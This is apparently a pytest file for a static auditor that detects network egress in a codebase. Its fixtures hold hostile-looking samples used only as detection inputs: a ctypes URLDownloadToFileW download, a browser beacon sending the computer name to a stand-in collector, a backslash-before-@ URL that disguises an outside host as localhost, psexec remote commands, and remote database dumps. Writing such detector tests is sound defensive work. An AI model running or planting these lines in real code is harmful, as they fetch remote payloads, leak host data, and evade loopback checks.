"""Makefile programs named by variables the file does not resolve or sets in branches; a ctypes library bound to a
name; an address opened in the default browser; connection strings whose host may come from keywords spread from a
mapping or a settings file; ssh, scp and rsync routed through another host; a backslash before `@` in a JavaScript
URL; Windows remote administration tools; UNC roots composed in Python; nox installs; key material in archives that
could not be opened; value-taking wrapper options; mail; a setup.cfg setuptools refuses; package URL names; the
database dump programs. Each test asserts both halves where there are two: the false thing is gone, the true
neighbour stays."""
from __future__ import annotations

import io
import zipfile
from pathlib import Path

import pytest

from entrovouch import key_provenance, sbom
from entrovouch.no_egress_auditor import audit


def _write(root: Path, rel: str, body) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(body if isinstance(body, bytes) else body.encode("utf-8"))
    return p


def _report(root: Path) -> list[tuple[str, int, str, str]]:
    return [(f["file"], f["line"], f["kind"], f["detail"]) for f in audit(root, label="t").findings]


def _found(root: Path) -> list[tuple[str, int, str]]:
    return [(f, n, k) for f, n, k, _ in _report(root)]


# ---------------------------------------------------------------- Makefile variables
@pytest.mark.parametrize("files, line, kind", [
    ({"Makefile": "include config.mk\n\ninstall:\n\t$(PIP) install -r requirements.txt\n",
      "config.mk": "VENV = .venv\nPIP = $(VENV)/bin/pip\n"}, 4, "unresolved-call"),
    ({"Makefile": "ifeq ($(OS),Windows_NT)\nPIP = py -m pip\nelse\nPIP = pip3\nendif\n\ndeps:\n"
                  "\t$(PIP) install -r requirements.txt\n"}, 8, "script-network-command"),
    ({"Makefile": "install:\n\t$(PIP) install -r requirements.txt\n"}, 2, "unresolved-call"),
    ({"Makefile": "install:\n\t@${PIP} install requests\n"}, 2, "unresolved-call"),
    ({"Makefile": "PIP != which pip\ninstall:\n\t$(PIP) install requests\n"}, 3, "unresolved-call"),
    ({"Makefile": "PIP := $(if $(VIRTUAL_ENV),pip,pip3)\ninstall:\n\t$(PIP) install requests\n"}, 3,
     "unresolved-call"),
    ({"Makefile": "PIP := $(shell which pip3)\ninstall:\n\t$(PIP) install requests\n"}, 3, "unresolved-call"),
    ({"Makefile": "all: PIP = pip\nall:\n\t$(PIP) install requests\n"}, 3, "unresolved-call"),
])
def test_a_make_variable_the_file_does_not_resolve_still_reports_the_command(tmp_path, files, line, kind):
    for rel, body in files.items():
        _write(tmp_path, rel, body)
    assert ("Makefile", line, kind) in _found(tmp_path)


def test_a_later_plain_assignment_replaces_branches_before_it(tmp_path):
    _write(tmp_path, "Makefile", "ifdef CI\nTOOL = pip\nelse\nTOOL = pip3\nendif\nTOOL = echo\nx:\n\t$(TOOL) install requests\n"
                                 "DL = wget -q\nDL = curl -sO\nget:\n\t$(DL) $(DATA_URL)\n")
    found = _found(tmp_path)
    assert not any(n == 8 for _, n, _ in found) and ("Makefile", 12, "script-network-command") in found


def test_a_make_variable_for_a_local_program_stays_quiet(tmp_path):
    _write(tmp_path, "Makefile", "ifeq ($(OS),Windows_NT)\nCC = cl\nelse\nCC = gcc\nendif\nall:\n\t$(CC) -o x x.c\n"
                                 "build:\n\t$(COMPILER) x.c\n")
    assert _found(tmp_path) == []


# ---------------------------------------------------------------- native libraries
@pytest.mark.parametrize("body, line", [
    ('import ctypes\nurlmon = ctypes.windll.urlmon\nurlmon.URLDownloadToFileW(None, "https://e.example.com/p", "p", 0, None)\n', 2),
    ("import ctypes\nws = ctypes.windll.ws2_32\nws.WSAStartup(2, None)\n", 2),
    ("from ctypes import windll\nwininet = windll.wininet\nwininet.InternetOpenW(None, 0, None, None, 0)\n", 2),
    ("from ctypes import *\nurlmon = windll.urlmon\n", 2),
    ("import ctypes\nlibc = ctypes.cdll.msvcrt\n", 2),
])
def test_a_native_library_bound_to_a_name_is_reported(tmp_path, body, line):
    _write(tmp_path, "a.py", body)
    assert ("a.py", line, "native-call") in _found(tmp_path)


def test_a_bound_loader_is_said_to_load_when_called(tmp_path):
    _write(tmp_path, "a.py", "from ctypes import windll\nload = windll.LoadLibrary\n")
    hit = [d for _, n, k, d in _report(tmp_path) if n == 2 and k == "native-call"]
    assert hit and "loader" in hit[0] and "loads a native library," not in hit[0]


def test_a_native_call_names_its_library(tmp_path):
    _write(tmp_path, "a.py", "import ctypes\nctypes.windll.urlmon.URLDownloadToFileW(None, 'u', 'p', 0, None)\n")
    assert any("windll.urlmon" in d for _, _, k, d in _report(tmp_path) if k == "native-call")


def test_an_attribute_named_like_a_loader_without_ctypes_is_not_native(tmp_path):
    _write(tmp_path, "a.py", "class C:\n    windll = None\nlib = C.windll\nx = settings.cdll.path\n")
    assert _found(tmp_path) == []


# ---------------------------------------------------------------- an address opened in the browser
@pytest.mark.parametrize("rel, body", [
    ("open.ps1", 'Start-Process "https://collect.example.com/beacon?host=$env:COMPUTERNAME"\n'),
    ("open.ps1", 'Start-Process -FilePath "https://a.example.com/x"\n'),
    ("open.bat", '@echo off\nstart "" "https://b.example.com/x"\n'),
    ("open.sh", "#!/bin/sh\nxdg-open https://c.example.com/x\n"),
])
def test_an_address_opened_in_the_browser_reaches_the_network(tmp_path, rel, body):
    _write(tmp_path, rel, body)
    hit = [d for f, n, k, d in _report(tmp_path) if k == "script-network-command"]
    assert hit and "default browser" in hit[0]


def test_an_address_only_printed_or_on_this_machine_is_not_opened(tmp_path):
    _write(tmp_path, "a.ps1", '$u = "https://collect.example.com/beacon"\nWrite-Host "open https://docs.example.com"\n'
                              'Start-Process "http://localhost:8080/"\n')
    assert [k for _, _, k in _found(tmp_path)] == ["external-url", "external-url"]


# ---------------------------------------------------------------- a host set elsewhere
@pytest.mark.parametrize("body, line", [
    ('import psycopg2\nfrom app_settings import DB_OPTIONS\nconn = psycopg2.connect("postgresql://localhost/app", '
     '**DB_OPTIONS)\n', 3),
    ('import psycopg2\nfrom dotenv import load_dotenv\nload_dotenv()\nconn = psycopg2.connect("postgresql:///app")\n', 4),
    ('import os, psycopg2\nos.environ.update(PGHOST="db.prod.example.com")\nc = psycopg2.connect("postgresql:///app")\n', 3),
    ('import os, psycopg2\nos.environ |= cfg\nc = psycopg2.connect("postgresql:///app")\n', 3),
    ('import redis\nr = redis.Redis.from_url("redis://localhost:6379/0", **opts)\n', 2),
])
def test_a_host_that_may_come_from_elsewhere_is_not_this_machine(tmp_path, body, line):
    _write(tmp_path, "db.py", body)
    found = _found(tmp_path)
    assert ("db.py", line, "unresolved-call") in found and not any(k == "loopback-call" for _, _, k in found)


def test_a_settings_file_does_not_override_a_host_written_in_the_string(tmp_path):
    _write(tmp_path, "db.py", 'import psycopg2\nfrom dotenv import load_dotenv\nload_dotenv()\n'
                              'c = psycopg2.connect("postgresql://localhost/app")\n'
                              'd = psycopg2.connect("postgresql://localhost/app", connect_timeout=3)\n')
    found = _found(tmp_path)
    assert ("db.py", 4, "loopback-call") in found and ("db.py", 5, "loopback-call") in found


# ---------------------------------------------------------------- ssh routed elsewhere
@pytest.mark.parametrize("line", [
    "ssh -o HostName=prod.example.com localhost uptime",
    "scp -o ProxyJump=bastion.example.com localhost:/etc/hosts ./hosts",
    'rsync -e "ssh -J bastion.example.com" -a localhost:/srv/ ./srv/',
    "scp -J bastion.example.com localhost:/a /b",
    'ssh -o ProxyCommand="nc proxy.example.com 22" localhost uptime',
    'ssh -F "$CFG" localhost uptime',
    'rsync --rsh="ssh -J b.example.com" localhost:/a /b',
])
def test_ssh_through_another_host_is_not_loopback(tmp_path, line):
    _write(tmp_path, "d.sh", "#!/bin/sh\n" + line + "\n")
    found = _found(tmp_path)
    assert ("d.sh", 2, "script-network-command") in found and not any(k == "loopback-call" for _, _, k in found)


@pytest.mark.parametrize("line", ["ssh localhost uptime", "scp -P 2222 localhost:/a /b", "rsync -av localhost:/a /b",
                                  "rsync -F -av localhost:/a /b"])
def test_ssh_to_this_machine_with_no_routing_stays_loopback(tmp_path, line):
    _write(tmp_path, "d.sh", "#!/bin/sh\n" + line + "\n")
    assert ("d.sh", 2, "loopback-call") in _found(tmp_path)


# ---------------------------------------------------------------- JavaScript backslash before @
@pytest.mark.parametrize("rel, body", [
    ("app.js", 'fetch("http://collect.example.com\\\\@localhost/x");\n'),
    ("ws.js", 'new WebSocket("ws://collect.example.com\\\\@localhost/");\n'),
])
def test_a_backslash_ends_the_host_in_javascript(tmp_path, rel, body):
    _write(tmp_path, rel, body)
    found = _found(tmp_path)
    assert (rel, 1, "network-call") in found and not any(k == "loopback-call" for _, _, k in found)


def test_a_plain_local_fetch_stays_loopback(tmp_path):
    _write(tmp_path, "app.js", 'fetch("http://localhost:8000/x");\n')
    assert ("app.js", 1, "loopback-call") in _found(tmp_path)


# ---------------------------------------------------------------- Windows remote administration
def test_windows_remote_administration_tools(tmp_path):
    _write(tmp_path, "a.bat", "\n".join([
        "@echo off", r"psexec \\srv -u admin cmd /c hostname", r"net view \\srv", r"sc \\srv query",
        "net view", "sc query", r"echo psexec \\srv", r"shutdown /r /m \\pc01 /t 0", r"sc \\localhost query"]) + "\n")
    found = _found(tmp_path)
    assert [(n, k) for _, n, k in found] == [(2, "script-network-command"), (3, "script-network-command"),
                                             (4, "script-network-command"), (8, "script-network-command"),
                                             (9, "loopback-call")]


# ---------------------------------------------------------------- UNC roots composed in Python
@pytest.mark.parametrize("body, line", [
    ('import os\nopen(os.path.join(r"\\\\fs01\\share", "x.csv")).read()\n', 2),
    ('import ntpath\nopen(ntpath.join(r"\\\\fs01\\share", "x")).read()\n', 2),
    ('open(r"\\\\fs01\\share" + "\\\\x.csv").read()\n', 1),
    ('SHARE = r"\\\\fs01\\share"\nwith open(f"{SHARE}\\\\x.csv") as f:\n    f.read()\n', 2),
    ('import smbclient\nsmbclient.open_file("//fs01/share/a")\n', 2),
])
def test_a_composed_unc_root_is_followed(tmp_path, body, line):
    _write(tmp_path, "a.py", body)
    assert ("a.py", line, "network-call") in _found(tmp_path)


def test_composed_local_paths_are_not_unc(tmp_path):
    _write(tmp_path, "a.py", 'import os\nbase = "data"\nopen(os.path.join(base, "x.csv")).read()\n'
                             'open("out" + ".txt").read()\nopen(f"{base}/x").read()\n')
    assert _found(tmp_path) == []


# ---------------------------------------------------------------- nox installs
def test_nox_install_runs_pip_install(tmp_path):
    _write(tmp_path, "noxfile.py", 'import nox\n\n@nox.session\ndef tests(session):\n    session.install("pytest")\n'
                                   '    session.install("--no-index", "--find-links", "wheels", "x")\n'
                                   '    session.conda_install("numpy")\n    session.run("pytest")\n')
    found = _found(tmp_path)
    assert ("noxfile.py", 5, "subprocess-net-binary") in found and ("noxfile.py", 7, "subprocess-net-binary") in found
    assert not any(n == 6 for _, n, _ in found)


# ---------------------------------------------------------------- key material in archives not opened
def _zip_with_encrypted_flag() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----\n")
    raw = bytearray(buf.getvalue())
    raw[6] |= 1                                     # the local header's general-purpose flag: encrypted
    cd = raw.find(b"PK\x01\x02")
    raw[cd + 8] |= 1                                # and the central directory's
    return bytes(raw)


def test_a_tree_of_only_unopened_archives_is_not_analysed(tmp_path):
    _write(tmp_path, "keys.zip", _zip_with_encrypted_flag())
    _write(tmp_path, "b.7z", b"7z\xbc\xaf\x27\x1c" + bytes(64))
    rep = key_provenance.scan_key_provenance(tmp_path)
    assert rep.verdict == "NOT-ANALYSED" and set(rep.not_scanned["archives_not_opened"]) == {"keys.zip", "b.7z"}


def test_an_unopened_archive_beside_read_files_keeps_the_verdict(tmp_path):
    _write(tmp_path, "b.7z", b"7z\xbc\xaf\x27\x1c" + bytes(64))
    _write(tmp_path, "a.py", "x = 1\n")
    assert key_provenance.scan_key_provenance(tmp_path).verdict == "NOTHING-FOUND"


# ---------------------------------------------------------------- wrappers with valued options, mail
@pytest.mark.parametrize("line, kind", [
    ("flock -w 10 /tmp/lock git pull", "script-network-command"),
    ("flock -x -w 30 /tmp/l git pull", "script-network-command"),
    ("flock --timeout 30 /tmp/l git pull", "script-network-command"),
    ("dotenvx run -f .env.prod -- curl https://a.example.com/x", "script-network-command"),
    ("mail ops@corp.example.com < body.txt", "script-network-command"),
    ("mail -s 'x' -c ops@corp.example.com root < r.txt", "script-network-command"),
])
def test_valued_options_and_mail(tmp_path, line, kind):
    _write(tmp_path, "a.sh", "#!/bin/bash\n" + line + "\n")
    assert ("a.sh", 2, kind) in _found(tmp_path)


def test_mail_to_a_local_user_and_a_lock_around_a_local_command_stay_quiet(tmp_path):
    _write(tmp_path, "a.sh", "#!/bin/bash\nmail -s 'disk full' root < report.txt\nflock -w 10 /tmp/lock echo hi\n")
    assert _found(tmp_path) == []


# ---------------------------------------------------------------- setup.cfg, package URLs, dump programs
@pytest.mark.parametrize("cfg", [
    "[options]\ninstall_requires = requests\n[options]\ninstall_requires = x\n",
    "[options]\ninstall_requires = requests\ninstall_requires = x\n",
])
def test_a_setup_cfg_setuptools_refuses_is_not_read(tmp_path, cfg):
    _write(tmp_path, "setup.cfg", cfg)
    hit = [d for f, n, k, d in _report(tmp_path) if k == "unparseable-source"]
    assert hit and "twice" in hit[0]
    assert sbom.build_sbom(tmp_path).components == []


def test_a_setup_cfg_with_each_option_once_is_read(tmp_path):
    _write(tmp_path, "setup.cfg", "[options]\ninstall_requires =\n    requests==2.31.0\n[flake8]\nmax-line-length = 120\n")
    comps = sbom.build_sbom(tmp_path).components
    assert [c.get("purl") if isinstance(c, dict) else c.purl for c in comps] == ["pkg:pypi/requests@2.31.0"]


def test_an_npm_package_url_is_lowercased(tmp_path):
    _write(tmp_path, "package.json", '{"dependencies": {"S-Upper": "1.0.0", "@Scope/Pkg": "2.0.0"}}')
    purls = sorted(c.get("purl") if isinstance(c, dict) else c.purl for c in sbom.build_sbom(tmp_path).components)
    assert purls == ["pkg:npm/%40scope/pkg@2.0.0", "pkg:npm/s-upper@1.0.0"]


@pytest.mark.parametrize("line, kind", [
    ("pg_dump -h db.prod.example.com -U app -f dump.sql app", "script-network-command"),
    ("pg_dump -f dump.sql app", "loopback-call"),
    ("mysqldump -h 10.0.0.5 -u root app > d.sql", "script-network-command"),
    ('mongodump --uri "mongodb://db.example.com/x" -o out', "script-network-command"),
])
def test_database_dump_programs(tmp_path, line, kind):
    _write(tmp_path, "a.sh", "#!/bin/sh\n" + line + "\n")
    assert ("a.sh", 2, kind) in _found(tmp_path)


def test_an_adapter_names_a_missing_output_folder(tmp_path, capsys):
    import json
    from entrovouch import sarif
    _write(tmp_path, "t/a.py", "x = 1\n")
    rep = tmp_path / "r.json"
    rep.write_text(json.dumps(audit(tmp_path / "t", label="t").__dict__, default=str), encoding="utf-8")
    with pytest.raises(SystemExit) as stop:
        sarif.main([str(rep), "--out", str(tmp_path / "nodir" / "x.sarif")])
    assert stop.value.code == 2 and "does not exist" in capsys.readouterr().err
